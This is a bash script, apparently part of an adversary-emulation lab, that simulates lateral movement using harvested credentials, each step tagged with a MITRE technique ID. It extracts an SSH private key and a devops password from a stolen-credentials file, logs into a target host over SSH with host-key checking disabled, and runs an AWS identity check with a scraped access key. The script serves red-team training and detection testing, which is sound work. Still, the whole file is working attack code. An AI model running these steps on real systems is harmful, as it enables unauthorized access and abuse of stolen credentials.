#!/usr/bin/env bash
# T1021.004 / T1078.004 — lateral movement simulation
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
require_lab

KEY="${STAGING_DIR}/id_rsa"
CREDS="${STAGING_DIR}/harvested-creds.txt"
SSH_TARGET="${SSH_LATERAL_TARGET:-lateral-ssh-target}"

log "Extracting SSH key from harvest (T1552.004)"
if [[ -f "${CREDS}" ]] && grep -q 'BEGIN OPENSSH PRIVATE KEY' "${CREDS}"; then
  awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' "${CREDS}" > "${KEY}"
  chmod 600 "${KEY}"
  log "SSH key extracted to ${KEY}"
else
  warn "No SSH key in harvest; skipping key-based lateral"
fi

log "SSH lateral movement with stolen key (T1021.004)"
if [[ -f "${KEY}" ]]; then
  ssh -i "${KEY}" -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "devops@${SSH_TARGET}" 'hostname; id' \
    2>&1 | tee "${STAGING_DIR}/lateral-ssh-key.log" || warn "SSH key lateral failed"
fi

log "SSH lateral movement with username and password (T1021.004)"
PASS="$(grep -E '^devops:' "${CREDS}" 2>/dev/null | head -1 | cut -d: -f2- || true)"
if [[ -n "${PASS}" ]] && command -v sshpass >/dev/null; then
  SSHPASS="${PASS}" sshpass -e ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "devops@${SSH_TARGET}" 'hostname; id' \
    2>&1 | tee "${STAGING_DIR}/lateral-ssh-password.log" || warn "SSH password lateral failed"
elif [[ -z "${PASS}" ]]; then
  warn "No devops:password line in harvest; skipping password-based lateral"
else
  warn "sshpass not installed; rebuild attacker image for password SSH demo"
fi

log "AWS CLI enumeration stub (T1078.004)"
if command -v aws >/dev/null 2>&1 && [[ -f "${CREDS}" ]]; then
  export AWS_ACCESS_KEY_ID="$(grep -o 'AKIA[A-Z0-9]*' "${CREDS}" | head -1 || true)"
  aws sts get-caller-identity 2>&1 | tee "${STAGING_DIR}/aws-identity.txt" || true
else
  echo "aws cli not available or no keys harvested" > "${STAGING_DIR}/aws-identity.txt"
fi

log "Lateral movement artifacts in ${STAGING_DIR}"
